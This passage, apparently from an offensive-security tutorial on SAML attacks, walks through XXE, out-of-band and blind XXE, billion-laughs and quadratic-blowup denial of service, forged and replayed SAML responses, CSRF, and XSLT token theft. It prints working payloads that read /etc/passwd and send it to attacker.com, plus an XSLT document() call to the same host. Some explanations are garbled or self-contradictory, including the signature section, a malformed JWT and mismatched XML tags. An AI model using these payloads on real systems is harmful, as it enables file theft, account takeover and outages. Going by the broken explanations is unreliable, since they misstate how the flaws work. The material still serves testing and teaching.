- The contents of the resulting /etc/passwd file are "http://attacker.com/?data=%internalSubset;" under the attacker's control. sent to the address.


As a result, the attacker can obtain the contents of the /etc/passwd file and send this information to http://attacker.com. In this way, sensitive user information of the target system can be obtained by the attacker.

I know this can be blocked. But remember, a hacker should always think differently. I urge you to think a little differently. For example, let's make it difficult, let's say you can't send a request to attacker.com because the firewall is blocking you. At the same time, you can't get any output to the screen because that too is blocked. What do you do? Would you leave it here? Or can you think of a different attack style? Leave an issue for this and let's evaluate your attack methods.

<hr> _ _

**External Entity Attack** : An attacker can access local or remote files or attack other targets on the network by referencing external entities with <!ENTITY> notifications.

- The attacker selects an application on the target SAML service as the target.
- An attacker generates XML content to send to the target SAML service.
- The attacker defines an external entity in the DTD section as follows:
```
<!ENTITY % payload SYSTEM "http://attacker.com/xxe.dtd">
<!ENTITY % externalEntity "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%internal;'>">
%payload;

This external entity definition points to a more hidden payload, "http://attacker.com/xxe.dtd". This file resides on an attacker-controlled server.

```

- The attacker uses the generated external entity definitions within the XML content:

```
<!DOCTYPE root [
<!ENTITY % externalEntity SYSTEM "http://attacker.com/xxe.dtd">
%externalEntity;
]>
<root></root>

```

- The attacker sends the prepared XML content to the target SAML service.
- The target SAML service analyzes the DTD when processing incoming XML content.
- External entities (%payload and %externalEntity) defined in the DTD are processed and their respective URLs are referenced.
- A request is sent to the attacker-controlled "http://attacker.com/xxe.dtd" address.
- The payload in the response from the attacker-controlled server is processed and an external entity named exfil is defined.
- The requested data (for example, sensitive file content) is sent to the attacker by referencing the exfil external entity.

In this example, the attacker can extract the desired file from the server under the control of the target SAML service using External Entity Attack.

**Parameter Entity Attack** : An attack method in which an attacker can access sensitive information or affect system resources by using <!ENTITY> declarations as parameter entities. In this type of attack, the attacker manipulates the parameter entities in the XML document, leading to undesirable results.

For example, let's say a SAML service is being targeted. The attacker wants to perform a Parameter Entity Attack by manipulating the parameter entities in the SAML request. The target SAML document looks like this:

```
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
ID="1234"
Version="2.0"
IssueInstant="2023-07-01T10:00:00Z">
<saml:Issuer>https://sp.example.com</saml:Issuer>
<samlp:NameIDPolicy AllowCreate="true" />
<samlp:RequestedAuthnContext Comparison="exact">
<saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
</samlp:RequestedAuthnContext>
</samlp:AuthnRequest>

```
The attacker seeks to access sensitive information by manipulating the parameter entities in the target SAML document. For this, it creates XML content as follows:

```
<!DOCTYPE root [
<!ENTITY % parameterEntity SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%parameterEntity;'>">
%payload;
]>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
ID="1234"
Version="2.0"
IssueInstant="2023-07-01T10:00:00Z">
<saml:Issuer>https://sp.example.com</saml:Issuer>
<samlp:NameIDPolicy AllowCreate="true" />
<samlp:RequestedAuthnContext Comparison="exact">
<saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
</samlp:RequestedAuthnContext>
%exfil;
</samlp:AuthnRequest>

```
In this XML content, the attacker defines a parameterEntity and points to the file "/etc/passwd". Then it defines an external entity named payload. This definition creates an external entity named exfil, whose content is "http://attacker.com/?data=%parameterEntity;" redirects to address.

Finally, the attacker attacks the target system using the external entity %exfil in the XML content it creates. In this way, the contents of the /etc/passwd file of the target system can be obtained by the attacker and sent to "http://attacker.com".

**Billion Laugh Attack (Billion Times Laugh Attack /yes the name is weird/)** : an attack method that causes the service to become unusable by overloading an XML processor. In this type of attack, the attacker creates a repeating pattern in the XML content, making the processor work intensively.

For example, let's say a SAML service is being targeted. The attacker wants to perform the Billion Laugh Attack by manipulating the XML content as follows:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY a "ha">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
<!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
<!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
<!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
<!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
<!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
<!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;">
<!ENTITY k "&j;&j;&j;&j;&j;&j;&j;&j;&j;&j;">
<!ENTITY billionLaughs "&k;&k;&k;&k;&k;&k;&k;&k;&k;&k;">
]>
<root>
<content>&billionLaughs;</content>
</root>

```

In this XML content, the attacker identifies an external entity (a) named "ha" and uses this external entity to create a repeating pattern. Each external entity is repeated 10 times more than the previous one. As a result, an external entity named "billionLaughs" is created and within this external entity there is a repeating pattern.

When the target SAML processor starts processing this XML content, it gets processor-intensive due to the repetitive pattern in the "billionLaughs" external entity. This processor density can lead to resource exhaustion and service unusable.


**Quadratic Blowup Attack** : It can cause memory overload when XML processors try to process an excessively long chain. In this case, the XML processor is overloaded due to insufficient memory or processing time and may render the service unavailable.

An attacker creates an excessively long chain using external entities in XML content. For example, the following XML content shows an example of an attack:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY a "xxxxxxxxxx">
<!ENTITY b "&a;&a;">
<!ENTITY c "&b;&b;">
<!ENTITY d "&c;&c;">
<!ENTITY e "&d;&d;">
<!ENTITY f "&e;&e;">
]>
<root>&f;</root>

```

- The XML content is POSTed to the target SAML service.
- The SAML processor starts processing the XML content and expands the external entities. In this case, each stage of the chain will be expanded repeatedly.
- As each stage of the chain is repeatedly extended with reference to other stages, the XML processor encounters an excessively long text chain. This causes memory overuse and increases processing time.
- The XML processor is overloaded due to insufficient memory or processing time, rendering the service unusable.

**Out-of-Band (OOB) XXE Attack** is an attack method that allows the attacker to transmit the results of the XXE attack independently from the target system. This attack method uses external communication mechanisms such as DNS queries, HTTP requests, or other network connections.

Below is a step-by-step example of how Out-of-Band XXE Attack works:

- The attacker discovers the XXE vulnerability on the target system. This vulnerability is a vulnerability where external entities are processed in an XML processor on the target system and external communication mechanisms can be used.

- The attacker prepares the XML content to be sent to the target system. This content contains the external entity declarations required to perform the XXE attack.

- The attacker redirects external entity declarations in XML content to external communication mechanisms suitable for Out-of-Band attack. For example, an attacker could use external links such as DNS queries, HTTP requests, or FTP connections in XML content.

- The attacker sends the prepared XML content to the target system. This is usually done with an HTTP POST request.

- The target system starts processing the XML content sent by the attacker. During the process, external entity notifications are run and routed to external communication mechanisms.

- Using the external communication mechanism, information is sent to the server under the control of the attacker or to another target independent of the target system. For example, DNS queries can send information to an attacker-controlled server, or HTTP requests can transfer data to an attacker-controlled server.

- The attacker receives the information obtained from the target system or the results of the attack through the external communication mechanism.

A few XML examples (I'll leave it up to you to figure out how to do this):

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
<!ENTITY %send SYSTEM "dns://attacker.com/">
%remote;
]>
<root>
<data>&send;</data>
</root>
```

xxe.dtd:

```
<!ENTITY % send "<!ENTITY &#x25; request SYSTEM 'dns://attacker.com/?domain=mytarget.com'>">
%send;

```


As a real-life example, let's consider Out-of-Band XXE Attack against an XML-based API of an e-commerce website. The attacker makes an HTTP POST request to the API using external entity declarations in XML content. The content of this request uses an external communication mechanism that sends data to the attacker-controlled server. The attacker monitors the requests to the server and receives the attack results. For example, it can obtain user information or payment information.


**Blind XXE Attack:** It is an attack method that allows the attacker to perform a XXE attack even when sensitive data cannot be returned. In this attack, the attacker tries to obtain information about the target system by checking for the presence or absence of responses from the XML processor.

Below is a step-by-step example of how Blind XXE Attack works:

- The attacker discovers the XXE vulnerability on the target system. This vulnerability is a vulnerability in the XML processor where external entities are processed and external network connections can be made.

- The attacker prepares the XML content and adds the external entity declarations required for the XXE attack. This XML content represents an XML request to be processed on the target system.
 
- The attacker sends the prepared XML content to the target application on the target system. This is usually accomplished with an HTTP POST request.
 
- The target system starts processing the XML content sent by the attacker. During the process, external entity declarations are run.
 
- The attacker tries to obtain information about the target system based on the responses of the XML processor. For example, an attacker could evaluate the XML processor's response to check for the presence or absence of a file or resource entity specified in an external entity declaration.
 
- An attacker can find clues to sensitive information by analyzing the differences in the XML processor's responses or error messages. For example, it may detect that a particular external entity is present in one response, while another response does not.

As a real-life example of Blind XXE Attack, we can think of it against an XML-based API of a web application. An attacker uses external entity declarations in its XML request to the API. The API processes the XML request sent by the attacker and returns a result in response. By analyzing this response, the attacker can learn about the API's behavior in the transaction process. For example, if different responses contain error messages or different responses contain information about the existence of entities, an attacker may have a chance to understand sensitive information or structure inside the API.

## SAML Message Integrity Abuse

SAML (Security Assertion Markup Language) is a standard for securely sharing authentication and authorization information between various systems. However, SAML message integrity abuse can allow attackers to bypass restrictions or falsify authentication mechanisms by using SAML messages or fake SAML messages from other users.

Let's consider a scenario:

- Alice wants to access an e-commerce site (SP) and contacts the IdentityProvider (IdP) to authenticate.

- Alice creates a SAML request to login to SP and sends it to IdP. Below is an example SAML request:

```
<AuthnRequest>
<Issuer>SP</Issuer>
<NameIDPolicy Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified"/>
</AuthnRequest>
```

- The attacker intercepts Alice's SAML request and seeks to gain unauthorized access to the SP.

- The attacker is trying to deceive the authentication mechanism by generating a fake SAML response. For example:

```
<Response>
<Issuer>IdP</Issuer>
<Status>
<StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
</Status>
<Assertions>
<Subject>
<NameID>attacker_user</NameID>
</Subject>
<Conditions>
<AudienceRestriction>
<Audience>SP</Audience>
</AudienceRestriction>
</Conditions>
</Assertion>
</Response>

```

- Attacker sends fake SAML response to SP.

- The SP accepts the fake SAML response as correct and thinks the attacker has successfully passed authentication.

As a result, the attacker gains unauthorized access to the SP system by impersonating Alice's account.

This scenario illustrates an example of SAML message integrity abuse. An attacker gains unauthorized access to the SP system by generating a fake SAML response to deceive the authentication process.

## Missing or Invalid Signature
could allow an attacker to create a signature and abuse the application. In this case, the attacker can bypass the signature verification mechanism and manipulate the data. Here is a scenario:

A company has a service provider called SP (Service Provider) and an identity provider called IdP (Identity Provider). SP provides authentication and authorization of users to IdP.

- Alice wants to access a web application via SP. It sends a SAML request to the SP to authenticate.

- SP creates and sends a SAML request to IdP to verify Alice's credentials. This SAML request could be as follows:

```
<AuthnRequest>
<Issuer>SP</Issuer>
<NameIDPolicy Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified"/>
</AuthnRequest>

```

- The attacker intercepts Alice's SAML request and wants to perform an attack. The attacker generates a fake SAML response to bypass the signature verification process. For example:

```
<Response>
<Issuer>IdP</Issuer>
<Status>
<StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
</Status>
<Assertions>
<Subject>
<NameID>alice@example.com</NameID>
</Subject>
<Conditions>
<AudienceRestriction>
<Audience>SP</Audience>
</AudienceRestriction>
</Conditions>
</Assertion>
</Response>
```

- The attacker sends the fake SAML response to the SP along with Alice's SAML request.

- SP receives the SAML response and implements the signature verification mechanism. However, verification fails because the signature is missing or invalid. SP rejects the SAML response and stops the process.

As a result, the attacker cannot gain unauthorized access to the SP and gain access to Alice's account, as it bypasses the signature verification mechanism.

As a result, SP does not allow an attacker to bypass the authentication mechanism because it cannot verify the signature. Alice cannot continue to access the SP because her authentication has failed. What the attacker gets is not permission to access the SP, but simply to stop the process or block the service.

## SAML Message Replay

It is an attempt to mislead the authentication mechanism by sending the same SAML message over and over. As a precaution against such attacks, Assertion IDs in SAML messages must be unique and each ID must be accepted only once.

- Alice wants to access a SP and contacts the IdP to authenticate.

- Alice creates and sends a SAML request to the IdP to access the SP. This SAML request could be as follows:

```
<AuthnRequest>
<Issuer>SP</Issuer>
<AssertionConsumerServiceURL>https://sp.com/acs</AssertionConsumerServiceURL>
<ID>123456789</ID>
</AuthnRequest>
```

- IdP receives the SAML request and performs authentication.

- The IdP generates a SAML response to the SP after successful authentication. Uniquely generates the Assertion ID in this SAML response. For example:


```
<Response>
<Issuer>IdP</Issuer>
<Status>
<StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
</Status>
<Assertion ID="ABC123">
<Subject>
<NameID>alice@example.com</NameID>
</Subject>
<Conditions>
<AudienceRestriction>
<Audience>SP</Audience>
</AudienceRestriction>
</Conditions>
</Assertion>
</Response>
```

- SP receives SAML response and checks Assertion ID. If Assertion ID has already been accepted, SP detects the attack and rejects the transaction. If the Assertion ID has not been accepted before, the SP accepts the authentication as successful and gains access to Alice.

In the case of a SAML Replay attack, the attacker tries to deceive the authentication mechanism by sending the same SAML message again. When the attacker sends the message multiple times, it aims for the SP to accept or process the same message multiple times.

The results the attacker could achieve could be as follows:

- Repeat Transaction: An attacker can send the same SAML message repeatedly, instructing the SP to perform the same authentication operation. In this case, the SP accepts each message and performs the same action multiple times. As a result, SP responds to the attacker's requests and uses its services unnecessarily.

- Authorization Violation: If the attacker sends the same SAML message on a different username, the SP can process each message as different users. In this case, the attacker could attempt to gain unauthorized access to other users' accounts or abuse the services.

- Denial of Service: An attacker can overload the SP with processing overhead by repeatedly sending the same SAML message. As the SP tries to accept each message, it consumes its resources and reduces its capacity to serve real users. As a result, the SP may reject normal users or experience performance issues to provide its services.

## CSRF

The SAML protocol handles the communication between SP and IdP via XML-based messages. CSRF attacks can affect the SAML protocol because SAML messages are securely signed XML contents containing a user's credentials. Therefore, CSRF attacks can be carried out on the SAML protocol if the attacker obtains the username and password.

### A general attack scenario

- Detecting the SAML integration of the target application: You can monitor the requests and responses made using the target's SAML-based login or authentication mechanism to determine the SAML integration of the target application.
- Identifying the processes that are the target of the attack: For the CSRF attack to be carried out on the SAML protocol, you must determine which processes will be targeted in the target application. For example, actions such as signing in, updating user information, or requesting access to a new resource can be targeted.
- Creating a fake HTML page for the attack: You must prepare the fake HTML page to be used in the attack. This page must contain the form or buttons that will be displayed in the user's browser to trigger the attack.
- Generating SAML requests: You need to create SAML requests for the attack. You must prepare the SAML message that performs the operation that is the target of the attack. This message should be edited to perform the desired action in the target application.
- Triggering the attack: You need to trigger the attack by delivering the fake HTML page you prepared to the target users. This page must contain content that directs the user to sign in to the target application or perform a specific action.
- Evaluate the effect of the attack: After performing the attack, you should check whether the desired action has taken place in the target application. For example, you can say that the attack was successful if an operation was successfully completed on the target application.

**Note: since this is a CSRF, I don't want to give you sample code about it. The reason is that I legally find CSRF more illegal than any other security flaw plus many companies don't give you anything for finding CSRF on their apps anyway. Therefore, I will skip further detailing this part and continue. Thank you for your understanding.**

## XML Comment Handling

It describes a security vulnerability where XML comments are not handled correctly. XML comments are special marks placed around text in XML documents. Comments are used to describe the content of the XML document or to add notes for reading or maintaining the document. However, an inadequate application of XML comment processing can introduce a vulnerability where an attacker with unauthorized access could authenticate as another user.

Below are real-life examples and code to help you better understand this vulnerability:

- Example 1: Unauthorized Authentication

```
<user>
<username>JohnDoe</username>
<password>secretpassword</password>
<!-- Admin user -->
<!-- <role>admin</role> -->
</user>

```

`<role>` element that defines the user's role is enclosed in a comment. This comment allows the user to have the administrator role. However, an inadequate XML comment processing mechanism may bypass or fail to process comments, authenticating the user as an administrator.

- Example 2: Unauthorized Data Modification

```
<order>
<id>12345</id>
<status>pending</status>
<!-- Delivery date postponed -->
<!-- <status>delivered</status> -->
</order>
```
In this example, the `<status>` element, which indicates the status of the order, is enclosed in a comment. Comments can override the status indicating the order has been delivered. An inadequate XML comment processing mechanism could not process comments, allowing an attacker to change the state of the order.

## XSLT (eXtensible Stylesheet Transformation Language)

It refers to a security vulnerability that can be used against SAML (Security Assertion Markup Language) applications.

XSLT is an XML-based transformation language and is used to convert XML documents to a different format or change their content. SAML is a standard for sharing authentication and authorization information. A SAML-based application sends user credentials to the identity provider (IdP), and the IdP authenticates the user and provides the application with the credentials (SAML token).

An XSLT attack is an attack that exploits the vulnerability of SAML-based applications to compromise credentials or bypass the authorization mechanism. Below are real-life examples and code to help you better understand this vulnerability:

- Example 1: SAML Credentials Spoofing

```
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
<saml:AttributeStatement>
<saml:Attribute Name="username" Value="JohnDoe"/>
<saml:Attribute Name="role" Value="admin"/>
</saml:AttributeStatement>
</saml:Assertion>

```
The attacker attempts to obtain the SAML token using the XSLT attack. The following XSLT code sends the entire SAML token to an attacker-controlled server:

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<xsl:output method="text"/>
 
<xsl:template match="/">
<xsl:value-of select="document('http://attacker.com/token.xml')"/>
</xsl:template>
</xsl:stylesheet>
```
The attacker retrieves XML from a remote source using the document() function during the XSLT conversion process. In this way, the SAML token is captured on the attacker-controlled server.

- Example 2: Bypassing Authorization Mechanism

```
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
<saml:AttributeStatement>
<saml:Attribute Name="username" Value="JohnDoe"/>
<saml:Attribute Name="role" Value="user"/>
</saml:AttributeStatement>
</saml:Assertion>

```
The attacker tries to change the user role using the XSLT attack and aims to access the administrator role. The following XSLT code changes the role in the SAML token:
```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<xsl:output method="xml"/>
 
<xsl:template match="/">
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
<saml:AttributeStatement>
<saml:Attribute Name="username">
<xsl:value-of select="saml:AttributeStatement/saml:Attribute[@Name='username']/@Value"/>
</saml:Attribute>
<saml:Attribute Name="role" Value="admin"/>
</saml:AttributeStatement>
</saml:Assertion>
</xsl:template>
</xsl:stylesheet>

```

the `<saml:Attribute Name="role" Value="admin"/>` line during the XSLT conversion process . Thus, the attacker can be considered a user with administrative privileges.

## Token Recipient Confusion

This vulnerability, called "Token Recipient Confusion", refers to a vulnerability that allows an attacker to log into another user's account with their own authentication token.

This vulnerability is usually caused by misconfigurations in an authorization or authentication system. The system mistakenly assumes that the attacker is a user with the authentication token and gives the attacker access to the target user's account. Thus, the attacker can use the privileges of the target user and gain access to sensitive information.

Example Scenario:

The system uses a JWT (JSON Web Token) for authentication. Here is an example JWT:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjMjM5MDIyfwF6QV4FlIwiaWF0IjoxNTE2MjMjM5MDIxwF6QT36KWF6FJM5MDIyf6FJM5MDIyf6FJT36KWF0JF6M5MDIyf6FJM5MDIxwF6QT36JhbGciOiJIUzI1NiIsIn _adQssw5c
```
The attacker takes this JWT and uses it to access the target user's account. The system accepts this JWT sent by the attacker as a valid authentication token and treats the attacker as if the target user is logged in. In this case, the attacker gains access to the target user's account and can use the privileges of that account.

## Labs & Resources
- https://research.aurainfosec.io/bypassing-saml20-SSO/
- https://github.com/yogisec/VulnerableSAMLApp
- https://github.com/dogangcr/vulnerable-sso
- http://sso-attacks.org/Category:Attack_Categorisation_By_Attack_on_SAML
- https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/
- https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/
- https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/
- https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SAML_Security_Cheat_Sheet.md